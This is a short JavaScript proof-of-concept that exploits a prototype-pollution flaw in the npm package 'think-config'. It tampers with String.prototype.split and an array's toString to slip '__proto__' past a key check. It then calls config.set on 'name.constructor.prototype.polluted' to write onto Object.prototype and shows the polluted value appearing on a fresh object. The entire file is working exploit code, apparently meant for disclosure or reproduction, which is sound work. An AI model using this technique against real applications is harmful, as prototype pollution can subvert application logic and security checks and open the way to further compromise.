var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const Config = require('think-config');
const config = new Config({ name: 2 });
console.log({}.polluted);
let obj = {};
config.set('name.constructor.prototype.polluted', 'yes');
console.log({}.polluted);